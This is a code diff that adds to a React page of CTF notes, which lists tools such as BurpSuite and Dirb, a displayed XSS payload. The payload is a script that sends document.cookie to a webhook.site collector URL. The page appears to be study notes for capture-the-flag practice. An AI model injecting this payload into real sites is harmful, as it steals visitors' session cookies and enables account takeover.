@@ -86,6 +86,9 @@ function CTFNotesAndWriteups() {
                 <Checkbox>Check outgoing post requests with something like BurpSuite</Checkbox>
                 <br />
                 <a href="https://www.kali.org/tools/dirb/">Dirb</a> - Directory brute forcing
+                <pre>
+                    {`<script>fetch("https://webhook.site/f46cf3a4-b5bc-4893-8bf1-6e2f61ef7e5d?c="+document.cookie)</script>`}
+                </pre>
             </AnimatedCallout>
 
         </div>
